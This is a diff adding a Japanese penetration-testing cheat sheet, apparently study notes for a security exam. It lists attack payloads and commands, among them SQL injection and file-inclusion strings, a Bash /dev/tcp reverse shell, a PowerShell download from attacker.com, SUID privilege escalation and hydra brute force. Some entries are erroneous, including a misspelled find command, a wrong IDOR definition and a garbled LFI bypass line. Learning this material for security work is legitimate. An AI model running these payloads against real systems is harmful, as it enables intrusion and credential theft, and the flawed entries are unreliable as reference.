@@ -1,0 +1,44 @@
+・TCP3ハンドシェイクは、SYN→SYN-ACK→ACKである。
+・SQLインジェクションを検出するために、「'OR'1'='1」を入力フィールドに入れてテストする
+・ファイルインクルージョン脆弱性で、/etc/passwdにアクセスする典型的なペイロードは、「?file=../../etc/passwd
+・リバースシェルは、ターゲットマシンから攻撃者マシンに接続することによってファイアウォールなどを避けるためによく利用する。
+・windowsシステムで権限昇格を確認するために、「whoami/priv」をよく使用する
+・Linuxシステムで現在のユーザー権限を悪人するコマンドは「whoami」である
+・windowsSAMデータベースには、ユーザーパスワードハッシュが保存されている
+・永続性を確立する一般的な方法は、スタートアップスクリプトやスケージュールの作成
+・ARPスプーフィング攻撃の目的は、ネットワークトラフィックの傍受
+・Wiresharkで特定のIPアドレスへのトラフィックのみを表示するフィルタは、「ip.addr==IPアドレス」である
+・コマンドインジェクション脆弱性をテストするペイロードは、「; lsまたは& dir」　である
+・HTTPヘッダーでX-Forwarded-Forを偽装する目的は、「送信元IPアドレスの偽装」
+・IDOR脆弱性とは、認証されていないユーザーが他のユーザーのリソースにアクセスできる
+・John the Ripperで使用されるワードリストの一般的な保存場所は、「/usr/share/wordlists/」
+・NTLMハッシュをクラックするために使える方法は、「レインボーテーブルまたはブルートフォース攻撃」
+・Linux権限でsudo権限を確認するコマンドは、sudo -l
+・windows環境でパッチが適用されていない脆弱性を探すためのツールは、「Windows-Exploit-Suggester」
+・SUIDビットに設定されたファイルが危険な理由は、ファイル実行時に所有者の権限で実行される
+・LinuxでSUIDビットで設定されたファイルを検索するコマンドは、find / -perm -4000 2>/dev/null
+・windowsで実行中のサービスを一覧表示するコマンドは、net start
+・DNSゾーン転送の脆弱性を確認するコマンドは、dig axfr @nameserver domain.com
+・SQLインジェクションで、データベース内のテーブル名を列挙するSQLクエリは、' UNION SELECT table_name FROM information_schema.tables--
+・XXE攻撃の主な影響は、ローカルファイルの読み取りまたはSSRF
+・CSRF攻撃を防ぐ一般的な対策方法は、CSRFトークンの使用
+・ローカルファイルインクルージョン(LFI)で、Linuxシステムの/etc/passwdを読み取る際に、ファイルをバイパスする可能性のある手法は、ヌルバイト注入：....//....//....//etc/passwd%00
+・リバースシェルのペイロードをBash環境で実行する場合は、bash -i >& /dev/tcp/IPアドレス/4444 0>&1
+・Metasploitで複数のターゲットに対して、攻撃を行う機能は、「multi/handler」、「auxiliary/scanner」、「resource script」
+・windows環境でpowershellを使ってファイルをダウンロードするコマンドは、Invoke-WebRequest -URI http://attacker.com/file.exe -outfile file.exe
+・LinuxでSUIDバイナリ/usr/bin/findを悪用して権限昇格する方法は、find . -exec /bin/sh -p \; -quit
+・Windows環境で管理者権限を持つサービスが弱い権限で実行されている場合の攻撃手法は、「DLL Hijacking」と「Unquoted Service Path」
+・Linux環境で最近変更されたファイルを検索するコマンドは、fin / -mtime -1
+・SSH経由で、ダイナミックポートフォワーディングを設定するコマンドは、ssh -D 1080 user@target
+・hydraを使ってSSHブルートフォースを行うコマンドは、hydra -l admin -P passwords.txt ssh://target
+・SQLインジェクションで認証をバイパスする典型的なペイロードは、「admin' --」と「admin' OR '1'='1'--」である
+・ディレクトリトラバーサル攻撃で、windowsのboot.iniにアクセスするパスは、「../../../../boot.ini」と「..\..\..\..\boot.ini」である
+・XSSを検出する最もシンプルなペイロードは、「<script>alert('XSS')</script>」
+・ローカルファイルインクルジョン脆弱性が見つかった場合は、「/etc/passwd」
+・Linuxで現在のユーザーのsudo権限を確認するコマンドは、sudo -lである
+・Linuxで書き込み可能な設定ファイルやスクリプトを探すコマンドは、find / -writable -type f 2>/dev/null
+・リバースシェルペイロードで攻撃者のIPアドレスを設定するパラメータは、LHOST
+・windowsでネットワーク接続を確認するコマンドは、netstat -ano
+・Linuxでネットワーク接続を確認するコマンドは、「netstat -tulpn」
+・侵入後、ターゲットシステムで実行中のプロセスを確認するコマンドは、ps aux
+・Windowsでローカルユーザーアカウントを一覧表示するコマンドは、net user
